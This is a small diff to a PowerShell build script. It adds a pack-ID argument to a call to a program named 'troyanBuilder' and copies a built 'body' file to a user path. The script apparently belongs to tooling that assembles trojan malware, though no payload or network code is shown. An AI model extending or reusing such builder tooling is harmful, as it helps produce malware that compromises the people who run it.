@@ -1,5 +1,5 @@
 param (
-    [string]$serverName
+    [string]$serverName, [string]$packId = ""
 )
 
 if ($serverName -eq "") {
@@ -14,7 +14,7 @@ $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 & (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName
 Set-Location -Path $scriptDir
 
-Start-Process -Wait $server.troyanBuilder -ArgumentList $serverName
+Start-Process -Wait $server.troyanBuilder -ArgumentList "$serverName $packId"
 
 Copy-Item -Path $server.body -Destination $server.userBody -Force
 
